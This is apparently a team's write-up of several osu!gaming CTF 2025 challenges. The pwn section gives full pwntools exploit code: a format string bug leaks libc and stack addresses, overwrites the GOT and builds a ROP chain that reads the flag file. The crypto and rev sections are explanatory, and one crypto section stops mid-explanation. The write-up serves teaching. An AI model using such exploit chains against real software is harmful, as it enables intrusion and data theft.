---
title: osu!gaming CTF 2025
date: 2025-10-27
authors:
    - all of us
visible: false # change this to true to view locally; change to false before pushing
---

This year, our team `slight_smile` took part in osu!gaming CTF 2025 and got 3rd
place! Here are our writeups for some of the interesting challs.

# `pwn/miss-analyzer-v2`

> miss-analyzer from last year was a bit buggy :((
>
> I changed some things to make it more secure, surely it's fine now, right?
>
> expected difficulty: 3/5
>
> Author: strellic

_written by samuzora_

This challenge is a osu! replay parser, and we can interact with it by uploading
hexdumps of the replay files. These are the protections enabled on the binary:

```ansi
[36m$[39m [38;5;14m: [36mchecksec[39m [1m[32manalyzer_patched[0m
[[1m[34m*[0m] '/home/samuzora/ctf/comp/2025-H0/osuctf/miss-analyzer-v2/dist/analyzer_patched'
    Arch:       amd64-64-little
    RELRO:      [33mPartial RELRO[39m
    Stack:      [32mCanary found[39m
    NX:         [32mNX enabled[39m
    PIE:        [31mNo PIE (0x3fe000)[39m
    RUNPATH:    [31mb'./lib'[39m
    SHSTK:      [32mEnabled[39m
    IBT:        [32mEnabled[39m
    Stripped:   [31mNo[39m
```

Since I don't actually know anything about the osu! replay file format, let's
read the decompilation to see how it's parsing the stuff.

## Analysis

The binary is protected with the following seccomp filter:

```ansi
[36m$[39m [38;5;14m: [36mseccomp-tools[39m [1m[32mdump[0m [1m[32m./analyzer[0m
 line  CODE  JT   JF      K
=================================
 0000: 0x20 0x00 0x00 0x00000004  A = arch
 0001: 0x15 0x00 0x06 0xc000003e  if (A != [38;5;230mARCH_X86_64[39m) goto 0008
 0002: 0x20 0x00 0x00 0x00000000  A = sys_number
 0003: 0x35 0x00 0x01 0x40000000  if (A < [38;5;120m0x40000000[39m) goto 0005
 0004: 0x15 0x00 0x03 0xffffffff  if (A != [38;5;120m0xffffffff[39m) goto 0008
 0005: 0x15 0x02 0x00 0x0000003b  if (A == [38;5;120mexecve[39m) goto 0008
 0006: 0x15 0x01 0x00 0x00000142  if (A == [38;5;120mexecveat[39m) goto 0008
 0007: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0008: 0x06 0x00 0x00 0x00000000  return KILL
```

Only `execve{:c}` and `execveat{:c}` are blocked, as well as any x86 syscalls.

In the parser logic, the hexstring is converted into raw bytes using the
`hex2bin{:c}` helper.

```c
length = hexs2bin(lineptr, &ptr);
cur_ptr = ptr;
```

The current state of reading the bytestring is stored in `cur_ptr{:c}`, and the
helper function `read_byte{:c}` will increment this pointer by one.

There are a few helper functions that are implemented using `read_byte{:c}`.
`consume_bytes{:c}` simply discards the next x bytes. `read_string{:c}` is quite
interesting, as it defines an expected format for a string, which is as follows:
1. All strings start with 0xb
2. Immediately following the start byte is a variable-length integer denoting
   the string length
3. After the variable-length integer follows the actual data in the string

The implementation of the variable-length integer is quite simple:

```c
for ( i = 0; ; i += 7 )
 {
   byte = read_byte(ptr, length);
   str_length |= (byte & 0x7F) << i;
   if ( byte >= 0 )
     break;
 }
```

The least significant 7 bits of the byte is used to denote part of the integer,
and the most significant bit denotes whether more data follows (if 1, there is
more data; if 0, there is no more data). Although there is no limit to the
length of this field, the maximum string length is bounded by the size of
the `str_length{:c}` variable which is `unsigned int{:c}`. Also, there is a
parameter `max_len{:c}` in `read_string{:c}` which prevents reading more than a
certain number of bytes. In this parser, it's always set to 0xff.

### Replay format

Knowing how these helper functions work, we can now determine the expected file
input format.

```c
mode = read_byte(&cur_ptr, &length);
if ( mode )
{
  switch ( mode )
  {
    case 1:
      puts("Mode: osu!taiko");
      break;
    case 2:
      puts("Mode: osu!catch");
      break;
    case 3:
      puts("Mode: osu!mania");
      break;
  }
} else {
      puts("Mode: osu!"); 
}
```

The first byte denotes the mode. Nothing interesting here.

```c
consume_bytes(&cur_ptr, &length, 4);
read_string(&cur_ptr, &length, format, 0xFFu);
printf("Hash: %s\n", format);
```

The next 4 bytes are consumed, followed by a hash string of maximum length 0xff.
Also nothing interesting here.

```c
read_string(&cur_ptr, &length, format, 0xFFu);
printf("Player name: ");
printf(format);
putchar(10);
```

Following is a username string, which is passed in raw to `printf{:c}`. This is
our vulnerability!

```c
read_string(&cur_ptr, &length, format, 0xFFu);
consume_bytes(&cur_ptr, &length, 10);
```

An unused string is expected after the username, and then 10 bytes of data are
discarded.

```c
v6 = read_short(&cur_ptr, &length);
printf("Miss count: %d\n", v6);
if ( v6 )
  puts("Yep, looks like you missed.");
else
  puts("You didn't miss!");
puts("=~=~=~=~=~=~=~=~=~=~=\n");
free(lineptr);
free(ptr);
seccomp_release(v12);
return 0;
```

The last field is 2 bytes indicating the number of misses. After this, the
program frees the buffers used and the seccomp filter, and exits.

So, the expected format is as follows:

```bash
mode (1 byte)
padding (4 bytes)
hash (variable-length string)
username (variable-length string)
unused (variable-length string)
padding (10 bytes)
miss_count (2 bytes)
```

## Exploit

We know that we want to target the username string. Let's write a helper
function to pack our payload:

```python
def encode_varint(value):
    encoded = bytearray()
    while True:
        byte = value & 0x7f
        value >>= 7
        if value:
            byte |= 0x80  # set continuation bit
            encoded.append(byte)
        else:
            encoded.append(byte)
            break
    return bytes(encoded)

def construct_payload(fmtstr):
    payload = b"\x00"
    payload += p32(0x0)

    # hash
    payload += p8(0xb)
    payload += flat(encode_varint(0x1))
    payload += b"a"

    # name
    payload += p8(0xb)
    payload += flat(encode_varint(len(fmtstr)))
    payload += fmtstr

    # unused
    payload += p8(0xb)
    payload += flat(encode_varint(0x1))
    payload += b"a"

    payload += b"\x00" * 10

    # missed
    payload += p16(0x0001)

    with open("./out", "wb") as file:
        file.write(payload)

    hexdump = os.popen("xxd -p -c0 ./out").read()

    sleep(0.5)

    return hexdump.encode()
```

With this, we can start planning our exploit.

### Looping

Firstly, we definitely need to exploit the fmtstr bug multiple times. This means
we need to return back to main somehow. Since PIE isn't enabled and we have
partial RELRO, we can overwrite the GOT entry of `seccomp_release{:c}` to
`main{:c}`, so we call main again right before we exit.

I used the `fmtstr_payload{:py}` function available in pwntools for most of the
writes in this challenge.

```python
payload = construct_payload(fmtstr_payload(16, {exe.got.seccomp_release: exe.sym.main}))
```

### Leaks

Before we start ropping, we need to leak the libc and stack address. This is the
state of the registers when we break at the `printf{:c}` call:

```ansi
LEGEND: [33mSTACK[39m | [34mHEAP[39m | [31mCODE[39m | [35mDATA[39m | [4m[31mWX[0m | RO
DATA
 [1mRAX [0m 0
[31m*[1mRBX [0m [34m0x16aefba0[39m ◂— '00000000000b01610b0725707c253324700b0161000000000000000000000100'
 [1mRCX [0m [31m0x7437265148f7 (write+23)[39m ◂— [38;5;148mcmp[38;5;15m [38;5;81mrax[38;5;15m,-[38;5;141m0x1000[39m /* 'H=' */
 [1mRDX [0m 0
[31m*[1mRDI [0m [33m0x7ffc98260e70[39m
[31m*[1mRSI [0m [33m0x7ffc9825ed00[39m ◂— 'Player name: t'
 [1mR8  [0m 0xd
 [1mR9  [0m 0x7fffffff
 [1mR10 [0m 0x402179 ◂— 'Player name: '
 [1mR11 [0m 0x246
 [1mR12 [0m [33m0x7ffc98261228[39m —▸ [33m0x7ffc98262a27[39m ◂— '/home/samuzora/ctf/comp/2025-H0/osuctf/miss-analyzer-v2/dist/analyzer_patched'
 [1mR13 [0m [31m0x401749 (main)[39m ◂— [38;5;148mendbr64[38;5;15m [39m
 [1mR14 [0m 0x403e08 (__do_global_dtors_aux_fini_array_entry) —▸ [31m0x4012e0 (__do_global_dtors_aux)[39m ◂— [38;5;148mendbr64[38;5;15m [39m
 [1mR15 [0m [35m0x743726821040 (_rtld_global)[39m —▸ [35m0x7437268222e0[39m ◂— 0
[31m*[1mRBP [0m [33m0x7ffc98260f90[39m —▸ [33m0x7ffc98261110[39m ◂— 1
[31m*[1mRSP [0m [33m0x7ffc98260e20[39m —▸ [34m0x16aef010[39m ◂— 0x2000000000007
 [1mRIP [0m [31m0x401ada (main+913)[39m ◂— [38;5;148mcall[38;5;15m [31mprintf@plt
```

We have a stack address in rsi, and libc address in rcx. These are accessed via
the 1st and 3rd format string indexes respectively, according to the x86_64
calling convention. Therefore, we can leak them with this payload:

```python
sleep(0.5)
p.clean()
payload = construct_payload(b"%p|%3$p")
p.send(payload)

p.recvuntil(b"Player name: ")

stack_leak = int(p.recvuntil(b"|", drop=True), 16)
libc.address = int(p.recvline(), 16) - 0x1148f7

print(f"{stack_leak = :0x}")
print(f"{libc.address = :0x}")
```

### ROP time!

Let's gather all our gadgets before we start ropping. Using the gadgets in the
provided libc, I narrowed the useful gadgets to these:

```asm
; 0x0000000000035732
pop rsp ;
ret ;

; 0x000000000002a3e5
pop rdi ; 
ret ;

; 0x000000000002be51
pop rsi ; 
ret ;

; 0x0000000000108b73 
pop rdx ; 
pop rcx ; 
pop rbx ; 
ret ;
```

In this chain, there's no need to use syscall because the seccomp filter is
quite lenient. So I'll just use the libc-provided wrappers.

We'll place the chain in a writable region in memory, and subsequently stack
pivot to that region using the `pop rsp{:asm}` gadget.

There's a small problem though. Because the maximum length of the username is
0xff bytes, we can't write the entire chain in one shot. We can use multiple
runs to slowly write the chain, and also try to reduce the size of the payload
by setting `write_size="short"{:py}` in `fmtstr_payload{:py}`.

```python
pop_rdi = libc.address + 0x000000000002a3e5
pop_rsi = libc.address + 0x000000000002be51
pop_rdx_rcx_rbx = libc.address + 0x0000000000108b73
pop_rsp = libc.address + 0x0000000000035732
ret = 0x401bea
OPEN = libc.sym.open
SENDFILE = libc.sym.sendfile

fake_stack = 0x404200

# name
payload = construct_payload(
    fmtstr_payload(16, {
        fake_stack-0x10: u64(b"flag.txt"),
        fake_stack+0x00: pop_rdi
    })
)
p.send(payload)

payload = construct_payload(
    fmtstr_payload(16, {
        fake_stack+0x08: fake_stack - 0x10,
        fake_stack+0x10: pop_rsi,
    })
)
p.send(payload)

payload = construct_payload(
    fmtstr_payload(16, {
        fake_stack+0x18: 0x0,
        fake_stack+0x20: pop_rdx_rcx_rbx
    })
)
p.send(payload)

payload = construct_payload(
    fmtstr_payload(16, {
        fake_stack+0x28: 0x0, # rdx
        fake_stack+0x30: 0x0, # rcx
    })
)
p.send(payload)

payload = construct_payload(
    fmtstr_payload(16, {
        fake_stack+0x38: 0x0, # rbx
        fake_stack+0x40: OPEN
    })
)
p.send(payload)

payload = construct_payload(
    fmtstr_payload(16, {
        fake_stack+0x48: pop_rdi,
        fake_stack+0x50: 0x1,
    })
)
p.send(payload)

payload = construct_payload(
    fmtstr_payload(16, {
        fake_stack+0x58: pop_rsi,
        fake_stack+0x60: 0x3,
    })
)
p.send(payload)

payload = construct_payload(
    fmtstr_payload(16, {
        fake_stack+0x68: pop_rdx_rcx_rbx,
        fake_stack+0x70: 0x0, # rdx
    })
)
p.send(payload)

payload = construct_payload(
    fmtstr_payload(16, {
        fake_stack+0x78: 0x100, # rcx
        fake_stack+0x80: 0x0, # rbx
    })
)
p.send(payload)

payload = construct_payload(
    fmtstr_payload(16, {
        fake_stack+0x88: SENDFILE
    })
)
p.send(payload)
```

Finally, to trigger the chain, we need to overwrite the saved RIP and stack
pivot to our fake stack. From the stack leak earlier, we can determine the saved
RIP of the current stack frame in GDB, and place the following chain there:

```python
target_rip = stack_leak + 0x1218

payload = construct_payload(
    fmtstr_payload(16, {
        0x404060: ret, # movaps
        target_rip: pop_rsp,
        target_rip+0x8: fake_stack
    }, write_size="short")
)
p.send(payload)
```

With this, we're done with the challenge!

```ansi
[1m[32m●[0m [36mcomp/2025-H0/osuctf/miss-analyzer-v2/dist[39m
[36m$[39m [38;5;14m: [36mpython3[39m [1m[32msolve.py[0m
[[1m[34m*[0m] '/home/samuzora/ctf/comp/2025-H0/osuctf/miss-analyzer-v2/dist/analyzer_patched'
    Arch:       amd64-64-little
    RELRO:      [33mPartial RELRO[39m
    Stack:      [32mCanary found[39m
    NX:         [32mNX enabled[39m
    PIE:        [31mNo PIE (0x3fe000)[39m
    RUNPATH:    [31mb'./lib'[39m
    SHSTK:      [32mEnabled[39m
    IBT:        [32mEnabled[39m
    Stripped:   [31mNo[39m
[[1m[34m*[0m] '/home/samuzora/ctf/comp/2025-H0/osuctf/miss-analyzer-v2/dist/lib/libc.so.6'
    Arch:       amd64-64-little
    RELRO:      [33mPartial RELRO[39m
    Stack:      [32mCanary found[39m
    NX:         [32mNX enabled[39m
    PIE:        [32mPIE enabled[39m
    SHSTK:      [32mEnabled[39m
    IBT:        [32mEnabled[39m
    Stripped:   [31mNo[39m
    Debuginfo:  [31mYes[39m
[[1m[34m◐[0m] Opening connection to miss-analyzer-v2.challs.sekai.team on port 1337: Trying 34.38
[[1m[32m+[0m] Opening connection to miss-analyzer-v2.challs.sekai.team on port 1337: Done
target_rip = 7ffc2e8b72c8
libc.address = 7d50a25f0000

... (a lot of spam from the printfs)



                                        \x10aaa`@@
Miss count: 1
Yep, looks like you missed.
=~=~=~=~=~=~=~=~=~=~=

osu{fmtstr_in_the_b1g_2025}[[1m[34m*[0m] Got EOF while reading in interactive
```

---

# `crypto / please-nominate`

> ok this time i'm going to be a bit more nice and personal when sending my message
>
> expected difficulty: 3/5
>
> Author: wwm

_written by wrenches and azazo_

We're given a relatively small source file and its output.

```python
from Crypto.Util.number import *

FLAG = open("flag.txt").read()

BNS = ["Plus4j", "Mattay", "Dailycore"]
print(len(FLAG))

for BN in BNS:
    print("message for", BN)
    message = bytes_to_long(
        (f"hi there {BN}, " + FLAG).encode()
    )
    n = getPrime(727) * getPrime(727)
    e = 3
    print(n)
    print(pow(message, e, n))
```

Let's refer to the moduli as $ n_i $, the plaintexts as $ p_i | \text{flag} $, and the ciphertexts as $c_i$, where | denotes concatenation. We're given the moduli $n_i$, the value of $a_i$, and the ciphertexts $c_i$. The goal is to solve for $\text{flag}$.

## Modelling

The approach here is to _model_ this information as a mathematical problem. Recall that RSA with exponent $ e = 3 $ can be modelled as a cubic polynomial:

$$ 

f_i(x) = x^3 \mod N 

$$ 

Furthermore, accounting for our given values $c_i$ (which are given to us, and are therefore constants) we express our polynomial as the following, with the implication that the _root_ of this polynomial would be our flag:

$$ 

f_i(x) \equiv x^3 - c_i \mod N 

$$

If we do this for all $i$, we will have created a family of polynomials $f_1, f_2, f_3$, all with the same shared root $x$, and we can do... something with that (we'll get there when we get there).

But however, recall that we have a custom _prepended_ message at the front of each plaintext. We need to manipulate these polynomials such that our $flag$ will be a shared root between all $f_i$. Prepending isn't something we can directly express mathematically, so we have to represent the concatenation operation as the _addition_ of some value $a_i$ which we can derive from the `hi there {bn}` message. It should be obvious how to do this - just bitshift the integer value of the message by $8N$, where N is the number of bytes in the flag (we know this to be 147, according to our provided output). 

We'll retrieve some values $a_i$ for each $i$, and we can finally model our polynomials with our shared root $\text{flag}$:

$$

f_i(x) \equiv (a_i + x)^3 - c_i \mod N

$$

## Background

For challenges like this, we would ideally want to apply _Coppersmith's method_, a lattice-based method to find _small_ roots of polynomials defined over some ring of polynomials $(\mathbb{Z}/N\mathbb{Z})[x]$ with $N$ composite.

A brief rundown on Coppersmith: finding integer solutions to a polynomial $ f(x) $ mod some value $ N $ is a lot, lot harder than just finding integer solutions to a polynomial $ f(x) $ in _general_. However, consider - what if for our value $ f(x) $, $ N $ was very large, to the point where $ f(x) < N $? This would mean that taking the modulus of $ f(x) $ with respect to $ N $ would effectively do nothing. We'd essentially be reducing it down to the easier problem of finding solutions over the integers.

For this to be done, we need to meet two requirements: we need our root $ x $ to be sufficiently small, and we also need our coefficients of the polynomial to be small as well. _Smallness_ is measured with respect to the modulus N, of course, $ x < N^\frac{1}{3} $ (for this specific polynomial) is sufficient.

The problem is, $ x $ is around 1200 bits, and each individual $ N_i $ is the product of two 727-bit (haha wysi wysi) primes. $ x $ is not small enough with respect to our individual $ N_i $ values for Coppersmith to be effective. If we were somehow able to construct a polynomial with a larger modulus that still retains $ \text{flag} $ as a small root, then it would work.

## CRT

So let's work on constructing that larger polynomial. We want to define some cubic $ g(x) \bmod \prod_{i=1}^{3} N_i $ such that our target $ \text{flag} $ root remains intact. 

We can do this by leveraging the Chinese Remainder Theorem. Consider a cubic function $ g $ with the following properties:

$$

g(x) \equiv Ax ^ 3 + Bx ^ 2 + Cx + D \mod N_1 N_2 N_3

$$

where $ A, B, C, D $ satisfy the following congruence relations:

$$
\begin{align}
A \equiv A_i \mod N_i\\
B \equiv B_i \mod N_i\\
C \equiv C_i \mod N_i\\
D \equiv D_i \mod N_i
\end{align}
$$

Does this cubic retain $\text{flag}$ as a root? The answer is yes. Definitionally, if we take $ g(\text{flag}) $ (with the knowledge that $ f_i(\text{flag}) \equiv 0 \mod N_i $), we can see that all values of $ g(\text{flag}) \equiv 0 \mod N_i $, i.e., all $N_i$ _divide_ $ g(\text{flag}) $, and therefore $ N $ must divide $ g(\text{flag}) $ too.

Let's take a step back and consider what this would  accomplish - we would now have a polynomial with a root $ flag $ of somewhere around 1200 bits, but now our modulus is around 4000 bits, thereby achieving our goal set out earlier. All that's left is to similarly reduce the coefficients of our polynomial $ g(x) $ using lattice reduction.

## Lattice Formulation

To restate the problem: we have a polynomial $ g $ defined by:

$$
  g(x) \equiv Ax^3 + Bx^2 + Cx + D \mod N
$$

with $ \text{flag} $ as some small root. We want to find a polynomial $ G $ that shares that root defined by:

$$
  G(x) \equiv ax^3 + bx^2 + cx + d \mod N
$$

where all the coefficients $ a, b, c, d $ are sufficiently small such that $ ax ^3 + bx ^2 + cx + d < N $. This allows us to solve an equivalent, easier problem of finding that root over the integers.

We do this by defining some related polynomials $ F $ with the shared root, encoding them as basis vectors in some lattice, and then reducing the lattice to find a combination of those bases that results in a resulting 'small' vector.

# `crypto / ssss+`

> can you do it again, but with hidden?
> 
> expected difficulty: 3/5
> 
> Author: wwm

_written by azazo_

```py
#!/usr/local/bin/python3
from Crypto.Util.number import *
import random

p = 2**255 - 19
k = 15
SECRET = random.randrange(0, p)

def lcg(x, a, b, p):
    return (a * x + b) % p

pp = getPrime(256)
a = random.randrange(0, pp)
b = random.randrange(0, pp)
with open("log.txt", "w+") as f: f.write(f"{a}, {b}, {pp}\n")
poly = [SECRET]
while len(poly) != k: poly.append(lcg(poly[-1], a, b, pp))
with open("log.txt", "a") as f: f.write(str(poly))

def evaluate_poly(f, x):
    return sum(c * pow(x, i, p) for i, c in enumerate(f)) % p

print("welcome to ssss", flush=True)
for _ in range(k - 1):
    x = int(input())
    assert 0 < x < p, "no cheating!"
    print(evaluate_poly(poly, x), flush=True)

if int(input("secret? ")) == SECRET:
    FLAG = open("flag.txt").read()
    print(FLAG, flush=True)
```

We have a polynomial $f(x) = \sum_{i=0}^{14} c_{i} x^i$ with the coefficients being consecutive outputs from a linear congruential generator (LCG) with unknown parameters:

$$
\begin{align}
c_1 &= \left(a c_0 + b\right) \bmod p\\
c_2 &= \left(a c_1 + b\right) \bmod p\\
&\vdots\\
c_{14} &= \left(a c_{13} + b\right) \bmod p
\end{align}
$$

We are then allowed to evaluate $f(x) \bmod 2^{255}-19$ for 14 times, before we must give the value of $c_0$ to the server to get the flag. There is also no simple way to cheese this challenge as the `assert 0 < x < p{:py}` check prevents us from entering multiples of $2^{255}-19$.

# `rev / tosu-2`
> (˶˃ ᵕ ˂˶) .ᐟ.ᐟ
>
> expected difficulty: 3/5
> 
> nc tosu-2.challs.sekai.team 1337
> 
> Author: es3n1n

_written by scuffed_

This is actually a part two to the initial `tosu-1` challenge, but the first part is a little flawed and not as interesting to solve (soz!), so we'll focus just on `tosu-2`.

Our dist comes with `tosu.exe` and `chal2.map`, which we run by invoking `.\tosu.exe chal2.map` to get this:

<video src="/assets/videos/tosu_1.mp4" controls preload></video>

This doesn't seem like a very doable beatmap to me... 

After the game concludes, a `replay.txt` file is created, which is filled with a bunch of 0s. I managed to hit 1 (one) circle in a demo and observed that the hit circle has a 1 in its place in the `replay.txt` generated! The netcat requires the submission of my `replay.txt`, so it seems like we need to have a specific sequence of hits and misses to pass.

## Analysis
Since we're skipping past the analysis of `tosu-1` to discuss its sequel straightaway, I'll describe the analysis as if we're dealing with this wholly blind. Let's toss the binary into Ghidra and see what we have to work with. Looking at the imports, we now know that the binary makes use of [Direct3D 9](https://learn.microsoft.com/en-us/windows/win32/api/d3d9/) to render the game.

The easiest way to isolate the relevant functions to the game logic is by working backwards from the strings we see at the end of the game:

![](/assets/images/tosu1.png)

Working with the XREFs, we find that the strings in the end game screen are printed in this block of code:
```c {lineNos=inline}
    if (cVar5 != '\0') {
        FUN_1400408a0("Map finished!",lVar10,uVar17,in_R9);
        FUN_14003e6a0();
        FUN_1400408a0("Score: %d",_DAT_14009a408 & 0xffffffff,uVar17,in_R9);
        FUN_1400408a0("Max Combo: %dx",(ulonglong)DAT_14009a410,uVar17,in_R9);
        FUN_1400408a0("300: %d",_DAT_14009a420 & 0xffffffff,uVar17,in_R9);
        FUN_1400408a0("100: %d",_DAT_14009a418 >> 0x20,uVar17,in_R9);
        FUN_1400408a0("50: %d",_DAT_14009a418 & 0xffffffff,uVar17,in_R9);
        FUN_1400408a0("Miss: %d",_DAT_14009a420 >> 0x20,uVar17,in_R9);
        pcVar11 = "Doesn\'t seem right";
        if (DAT_14009a4ed != '\0') {
            pcVar11 = "Correct! Submit your replay.txt to the server";
        }
        FUN_1400408a0("Solution: %s",(longlong)pcVar11,uVar17,in_R9);
        FUN_14000fee0();
    }
```
and this chunk of code lies in the function `FUN_140005810`. This function is our main gameloop, and we can see straightaway that we're missing some symbols here and there, but it won't really affect our solve for this challenge. Of note is the global `DAT_14009a4ed`, which appears to be our "win" indicator, so let's rename it to `win_condition`.

Another notable bit of the gameloop function is this data initialization that occurs early on:

```c
  if ((*(int *)(lVar10 + 4) < DAT_14009a4e8) && (FUN_14004b3b4(&DAT_14009a4e8), DAT_14009a4e8 == -1)) {
        _DAT_14009a450 = 0x2cfe542af6bcdfc9;
        uRam000000014009a458 = 0xf827a156b5343296;
        _DAT_14009a460 = 0xc2cf199748081bd1;
        uRam000000014009a468 = 0x6e26919c7c7bf2f9;
        _DAT_14009a470 = 0x8b5b00d8abffae1b;
        uRam000000014009a478 = 0x96e0cde33808f13d;
        _DAT_14009a480 = 0xc59babdd835b5d0b;
        uRam000000014009a488 = 0x6b9e07b75d498495;
        _DAT_14009a490 = 0xf18c48ce17b46361;
        uRam000000014009a498 = 0xf9b94c2601dfe836;
        _DAT_14009a4a0 = 0xdc46ed6a800e449c;
        uRam000000014009a4a8 = 0xb67a2df488263a5b;
        _DAT_14009a4b0 = 0x6621c22f7d4d5b15;
        uRam000000014009a4b8 = 0xe4b8d8381dc49605;
        _DAT_14009a4c0 = 0x82df48ce211e68a5;
        uRam000000014009a4c8 = 0x1a6836a93b27b7e4;
        DAT_14009a4d0 = 0;
        DAT_14009a4d8 = 0;
        _DAT_14009a4e0 = 0;
        atexit(FUN_140076220);
        _Init_thread_footer(&DAT_14009a4e8);
  }
```

Which fills out `DAT_14009a450`. Looking at other references to `DAT_14009a450`, we spot this checker loop:

```c
    uVar14 = thunk_FUN_140049d80((undefined1 (*) [32])&local_208,(undefined1 (*) [32])&local_1f8);
    puVar1 = &DAT_14009a450;
    uVar16 = 0;
    while (&DAT_14009a450 + uVar14 != puVar1) {
    if ((&DAT_14009a450)[uVar16] != (&DAT_140077660)[uVar16]) {
        win_condition = '\0';
        goto LAB_140005f93;
    }
    puVar1 = &DAT_14009a451 + uVar16;
    uVar16 = uVar16 + 1;
    }
    win_condition = '\x01';
    goto LAB_140005f93;
```

So we can see that `DAT_14009a450` is eventually checked against some target array `DAT_140077660`, where if and only if all the values line up, do we get our `win_condition` set to true. So let's trace backwards a bit more to see how `DAT_14009a450` gets modified:

```c
    pcVar11[(int)uVar6] = cVar5;
    if (cVar5 == '\x01') {
        DAT_14009a408 = DAT_14009a408 + 50;
        DAT_14009a418 = DAT_14009a418 + 1;
    }
    else if (cVar5 == '\x02') {
        DAT_14009a408 = DAT_14009a408 + 100;
        DAT_14009a41c = DAT_14009a41c + 1;
    }
    else {
        DAT_14009a408 = DAT_14009a408 + 300;
        DAT_14009a420 = DAT_14009a420 + 1;
    }
    uVar7 = DAT_14009a40c + 1;
    _DAT_14009a408 = CONCAT44(uVar7,DAT_14009a408);
    if ((int)DAT_14009a410 < (int)uVar7) {
        DAT_14009a410 = uVar7;
    }
    FUN_140004c00(&DAT_14009a450,uVar6,cVar5);
```

Judging by the values being added, we can make an educated guess that `DAT_14009a408` is our score (which is easily verifiable by the end game screen!), `DAT_14009a420` is some track of the number of hits and the local `cVar5` is some way of determining the type of hit it is. The local `uVar6` is also a tracker of our current circle count, which we can easily dynamically verify if needed.

We can find another call to `FUN_140004c00` earlier on in this loop:

```c
    if ((pcVar11[uVar14] == '\0') && (*(float *)(uVar19 + lVar13) + 0.2 < fVar22)) {
        pcVar11[uVar14] = '\x04';
        _DAT_14009a408 = _DAT_14009a408 & 0xffffffff;
        DAT_14009a424 = DAT_14009a424 + 1;
        FUN_140004c00(&DAT_14009a450,(uint)uVar14,'\x04');
        pcVar11 = DAT_14009a3f0;
        lVar10 = DAT_140099008;
        lVar13 = DAT_140099000;
    }
    uVar14 = uVar14 + 1;
```

This appears to be called whenever we miss a circle, with it calling `FUN_140004c00` with hit type `0x4`. Let's take a closer look at `FUN_140004c00` then!

```c
    void FUN_140004c00(byte *param_1,uint param_2,char param_3){
        char local_res18 [16];
        
        local_res18[0] = (param_3 != '\x04') + '0';
        FUN_140001670((longlong *)(param_1 + 0x80),local_res18);
        if (param_3 != '\x04') {
            param_1[param_2 & 0x7f] = param_1[param_2 & 0x7f] ^ (char)param_2 * '\x1b' + 0x37U;
        }
        FUN_1400053c0(param_1);
        return;
    }
```

Knowing that `param_1` is our tracking global `DAT_14009a450`, `param_2` is the current circle index and `param_3` is the hit type, we can discern that the logic here is essentially applying some XOR to the current position in the tracking global if we _don't miss_ (doesn't have to be a 300) the circle. 

The mutation step is equivalent to performing:
```py
state[n % 128] ^= (n * 27 + 55) & 0xff
```

This is followed up by the application of `FUN_1400053c0`.

`FUN_1400053c0` essentially takes the value to the left and right of the current index, XORs them together, then stores it in the current index. The decompilation is fairly verbose, but the Python equivalent function looks like this:

```py
def FUN_1400053c0(a):
    o = []
    for i in range(len(a)):
        k1 = 0
        if i > 0:
            k1 = a[i-1]
        k2 = 0
        if i < len(a)-1:
            k2 = a[i+1]
        o.append(k1 ^ k2)
    return o
```

So now we've finally landed on an objective: some sequence of hits and misses will cause some values of this global array to be XOR'd, which after all the transformations are complete, should be equivalent to some target array. So how do we approach that?

## A Dash of Linear Algebra
A naïve approach would be to model the entire problem in Z3 and hope it eventually resolves, but due to the XORs being "conditional", the direct implementation would lead to a state explosion that doesn't resolve. So we need to be a bit smarter with it.

Note that in $GF(2)$, our good ol' XOR operation $\oplus$ becomes plain addition! Why is this relevant? Well, this means that we can actually model all of our state transitions as linear operations under $GF(2)$ and perhaps apply some lienar algebra to solve this challenge...

### XORing Thy Neighbour
First, let's try and represent `FUN_1400053c0`, which is always applied irregardless of whether we hit or miss a circle. This is a very direct application of the above observation! We can create a matrix $M$ that represents this state transition by "tessellating" identity matrices. 

A toy example would look like this:
* Define $N$ to be the number of states. For our example, we peg it at $4$.
* Define $b$ to be the number of bits per state. For our example, let's just leave it as $1$
* Define $S_n$ to be our state at iteration $n$, being a column matrix of our states $s_i$ for index $i$

Now, we want to construct a matrix $M$ whereby

$$
S_{n+1} = 
\begin{pmatrix}
s_2\\ 
s_1 + s_3\\
s_2 + s_4\\
s_3
\end{pmatrix} = MS_n = 
M
\begin{pmatrix}
s_1\\ 
s_2\\
s_3\\
s_4
\end{pmatrix}
$$

The appropriate $M$ would look like:
$$
M = \begin{pmatrix}
0 & 1 & 0 & 0\\ 
1 & 0 & 1 & 0\\
0 & 1 & 0 & 1\\
0 & 0 & 1 & 0
\end{pmatrix}
$$

To extend this to 1 byte == 8 bits, we simply substitute the $1$s in $M$ with identity matrics of size $N$, turning $M$ into a huge block matrix. Furthermore, we just have to keep multiplying by this matrix $M$ to get the next state, and the next, and so on! Modelling this in Sage, we get:

```py
N  = 128 # number of states == len(DAT_14009a450)
T  = 1080 # number of steps == number of circles
NB = 8*N # 8 bits to a byte

F = GF(2)
M = matrix(F, NB, NB)
for i in range(N):
    for bit in range(8):
        row = i*8 + bit
        if i > 0:
            M[row, (i-1)*8 + bit] = 1
        if i < N-1:
            M[row, (i+1)*8 + bit] = 1
```

### The Hit Mutation

So now we need to model what happens when you successfully Click a Circle. Recall the mutation step is:
```py
state[n % 128] ^= (n * 27 + 55) & 0xff
```
Once again, since we are operating in $GF(2)$, this is all linear, and instead of being an XOR against `(n * 27 + 55) & 0xff`, it becomes merely addition. This means that we can model our complete state transition to be
$$
S_{n+1} = MS_{n} \oplus u_n \cdot \text{hits[n]}
$$

Where $u_n$ is the XOR term $n * 27 + 55 \pmod{128}$ that will be added to the $n \pmod{128}$ element of the column matrix. Here, $\text{hits[n]}$ would be either $0$ or $1$, essentially being a one-hot encoding for whether we hit the circle or not.

This construction would look like this in Sage:
```py
idx = n % N
val = (n*27 + 55) & 0xff
u = vector(F, NB)
for bit in range(8):
    if (val >> bit) & 1:
        u[idx*8 + bit] = 1
```

We can then unroll our entire expression, turning the recurrence relation into a big sum:
$$
S_{n} = M^nS_{0} \oplus \sum_{i=0}^{n-1} M^{n-i} u_i \cdot \text{hits[i]}
\implies \sum_{i=0}^{n-1} M^{n-i} u_i \cdot \text{hits[i]} = S_{n} \oplus  M^nS_{0}
$$

Now of course, this big sum of matrices itself can also be modelled as matrix multiplication! Our target vector, $\text{hits}$, can be treated as a column vector, and all our transformations $M^{n-i} u_i$ can be columns of a matrix we multiply it against. Our final problem thus boils down to:
$$
\begin{pmatrix}
M^{n} u_0 & M^{n-1} u_1 & ... & u_n
\end{pmatrix}
\cdot \text{hits[n]} = S_{n} \oplus  M^nS_{0}
$$

